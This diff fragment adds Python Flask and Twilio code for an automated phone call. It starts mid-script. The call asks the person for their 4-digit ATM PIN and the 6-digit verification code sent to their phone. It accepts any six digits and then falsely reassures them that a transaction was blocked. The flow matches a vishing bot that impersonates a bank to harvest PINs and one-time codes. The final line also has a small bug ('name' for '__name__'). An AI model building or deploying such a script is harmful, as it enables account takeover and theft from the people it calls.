@@ -1,0 +1,41 @@
+finish_on_key="#",
+        timeout=10,
+        action="/pin-input",
+        method="POST"
+    )
+    response.say("Invalid PIN. Please re-enter your 4-digit ATM PIN followed by the pound key (#).")
+    response.redirect("/atm-pin")
+    return str(response)
+
+# Verification code
+@app.route("/verification-code", methods=["POST"])
+def verification_code():
+    response = VoiceResponse()
+    response.say("Please enter the 6-digit verification code sent to your phone number followed by the pound key (#).")
+    response.gather(
+        input="dtmf",
+        finish_on_key="#",
+        timeout=10,
+        action="/verify-code-input",
+        method="POST"
+    )
+    response.say("The verification code entered is invalid. Please try again.")
+    response.redirect("/verification-code")
+    return str(response)
+
+# Final response
+@app.route("/verify-code-input", methods=["POST"])
+def verify_code_input():
+    verification_code = request.form.get("Digits")
+    response = VoiceResponse()
+
+    if len(verification_code) == 6:
+        response.say("The transaction has been blocked, and no funds have been withdrawn from your account. Thank you. Goodbye.")
+    else:
+        response.say("The verification code entered is invalid. Please re-enter the 6-digit code sent to your phone number followed by the pound key (#).")
+        response.redirect("/verification-code")
+
+    return str(response)
+
+if name == "__main__":
+    app.run(debug=True)
